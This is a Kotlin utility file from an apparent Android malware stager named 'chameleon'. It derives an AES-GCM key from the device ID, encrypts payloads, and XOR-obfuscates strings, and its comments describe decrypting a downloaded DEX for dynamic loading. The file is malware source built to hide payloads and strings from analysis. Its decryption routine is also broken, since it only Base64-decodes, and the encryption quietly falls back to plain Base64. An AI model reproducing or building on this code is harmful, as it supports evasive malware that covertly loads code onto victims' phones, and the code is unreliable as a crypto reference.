package com.chameleon.stager.utils

import android.util.Base64
import java.security.SecureRandom
import java.security.spec.KeySpec
import javax.crypto.Cipher
import javax.crypto.SecretKey
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

object CryptoUtils {
    private const val ALGORITHM = "AES/GCM/NoPadding"
    private const val GCM_TAG_LENGTH = 128
    private const val GCM_IV_LENGTH = 12
    private const val ITERATIONS = 10000
    private const val KEY_LENGTH = 256

    // Derive a key from device ID using PBKDF2
    private fun deriveKey(deviceId: String): SecretKey {
        val salt = "ChameleonSalt2026".toByteArray()
        val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
        val spec: KeySpec = PBEKeySpec(deviceId.toCharArray(), salt, ITERATIONS, KEY_LENGTH)
        val tmp = factory.generateSecret(spec)
        return SecretKeySpec(tmp.encoded, "AES")
    }

    fun encryptPayload(plaintext: ByteArray, deviceId: String): String {
        try {
            val key = deriveKey(deviceId)
            val cipher = Cipher.getInstance(ALGORITHM)
            val iv = ByteArray(GCM_IV_LENGTH)
            SecureRandom().nextBytes(iv)
            val spec = GCMParameterSpec(GCM_TAG_LENGTH, iv)
            cipher.init(Cipher.ENCRYPT_MODE, key, spec)

            val ciphertext = cipher.doFinal(plaintext)
            val combined = ByteArray(iv.size + ciphertext.size)
            System.arraycopy(iv, 0, combined, 0, iv.size)
            System.arraycopy(ciphertext, 0, combined, iv.size, ciphertext.size)

            return Base64.encodeToString(combined, Base64.NO_WRAP)
        } catch (e: Exception) {
            // Fallback: base64 encode only (minimal obfuscation)
            return Base64.encodeToString(plaintext, Base64.NO_WRAP)
        }
    }

    fun decryptPayload(encoded: ByteArray): ByteArray {
        // Payload decryption (for DEX loading)
        // In production, this decrypts the downloaded DEX
        try {
            val dataStr = String(encoded)
            val combined = Base64.decode(dataStr, Base64.NO_WRAP)
            return combined
        } catch (e: Exception) {
            return encoded
        }
    }

    fun obfuscateString(input: String): String {
        val key = 0x55.toByte()
        val bytes = input.toByteArray()
        val result = ByteArray(bytes.size)
        for (i in bytes.indices) {
            result[i] = (bytes[i].toInt() xor key.toInt()).toByte()
        }
        return Base64.encodeToString(result, Base64.NO_WRAP)
    }

    fun deobfuscateString(encoded: String): String {
        val key = 0x55.toByte()
        val bytes = Base64.decode(encoded, Base64.NO_WRAP)
        val result = ByteArray(bytes.size)
        for (i in bytes.indices) {
            result[i] = (bytes[i].toInt() xor key.toInt()).toByte()
        }
        return String(result)
    }
}
